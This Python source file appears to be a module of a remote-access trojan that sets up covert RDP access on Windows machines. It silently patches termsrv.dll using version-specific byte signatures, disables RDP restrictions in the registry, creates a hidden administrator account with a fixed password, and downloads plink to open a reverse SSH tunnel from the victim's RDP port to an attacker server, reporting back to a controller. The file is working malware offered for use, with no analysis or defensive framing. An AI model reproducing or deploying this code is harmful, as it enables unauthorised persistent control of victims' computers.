import ctypes
import os
import subprocess
from Modules import execute as Execute
from client import SERVER_ADDRESS

TERMSRV_DLL_PATH = 'C:\\Windows\\System32\\termsrv.dll'


def is_admin_privilege():
    """ Return if the app has admin privileges"""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def read_dll_source():
    """ Returns the Hex source of the dll """
    with open(TERMSRV_DLL_PATH, 'rb') as f:
        return f.read().hex()


def shell_command(command):
    """ Silently execute a shell command """
    subprocess.call(command, shell=True, creationflags=0x08000000)


def reverse_rdp_port(client, ssh_password):
    plink_path = Execute.download_and_execute(url='https://the.earth.li/~sgtatham/putty/0.75/w64/plink.exe')
    if plink_path is not None:
        command = 'echo n | {plink_path} ssh-rdp-server@{ssh_ip} -pw {ssh_password} -P {ssh_port} -2 -4 -T -N -C -R {connection_port}:127.0.0.1:3389'.format(plink_path=plink_path, ssh_ip=SERVER_ADDRESS, ssh_password=ssh_password, ssh_port=22, connection_port=6969)
        subprocess.Popen(command, shell=True, creationflags=0x08000000)  # Start tunnel without blocking
        client.send('Successfully patched and created a reverse rdp tunnel.')


def patch(client, ssh_password):
    if is_admin_privilege() is False:
        print('No admin perms')
    else:
        patch = 'b80001000089813806000090'
        unpatched_bytes_list = ['39813c0600000f84e16a0100',  # ver 21H1/21H2
                                '39813C0600000F84D9510100',  # ver 20H1/2004
                                '39813C0600000F8421680100',  # ver 10.0.19041.1023
                                '39813c0600000f845d610100',  # ver 1909/1903
                                '39813c0600000f843b2b0100',  # ver 1809
                                '3B81200300000F84B3040200',  # ver 1809 (another one)
                                '8b993c0600008bb938060000',  # ver 1803
                                '39813C0600000F8453710200',  # ver 1703
                                '39813c0600000f84b17d0200'  # ver 1709
                                ]
        patched = False

        source = read_dll_source()
        if patch in source:
            # Start the service
            shell_command('net start termservice /y')
            patched = True

            # Reverse RDP Port
            reverse_rdp_port(client, ssh_password)
        if not patched:
            for unpatched_bytes in unpatched_bytes_list:
                if unpatched_bytes in source:
                    # Stop the service from running in the background
                    shell_command('net stop termservice /y')

                    # Take 'TrustedInstaller' ownership to allow editing
                    shell_command('takeown /f "{}" /a'.format(TERMSRV_DLL_PATH))
                    shell_command('icacls "{}" /grant "everyone":(F)'.format(TERMSRV_DLL_PATH))

                    # Patch Dll
                    patched_source = source.replace(unpatched_bytes, patch)
                    with open(TERMSRV_DLL_PATH, 'wb') as f:
                        f.write(bytes.fromhex(patched_source))

                    # Give back 'TrustedInstaller' ownership to the patched termsrv dll
                    shell_command('icacls "{}" /setowner "NT SERVICE\TrustedInstaller"'.format(TERMSRV_DLL_PATH))
                    shell_command('icacls "{}" /grant "NT SERVICE\TrustedInstaller:(RX)"'.format(TERMSRV_DLL_PATH))
                    shell_command('icacls "{}" /remove:g "everyone":(F)')

                    # Add registry rules to make the machine compatible with the patch
                    shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000000 /f')  # Enable RDP
                    shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0X00000000 /f')  # Allow multiple connections to the RDP
                    shell_command('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 0X000f423f /f')  # Allow unlimited connection at a time
                    shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppAllowList" /v fDisabledAllowList /t REG_DWORD /d 0X00000001 /f')

                    # Add hidden user with admin perms to log into
                    shell_command('REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hidden /t REG_DWORD /d 0X00000000 /f')  # Hide from user
                    shell_command('net user hidden hidden /ADD')  # Make a new user (user:pass)(hidden:hidden)
                    shell_command('net localgroup Administrators hidden /ADD')  # Give admin perms

                    # Start the service
                    shell_command('net start termservice /y')
                    patched = True
                    print('Patched source')

                    # Reverse RDP Port
                    reverse_rdp_port(client, ssh_password)
                    break
        if not patched:
            client.send('HRDP failed. No patches were available')
            print('No available patches')
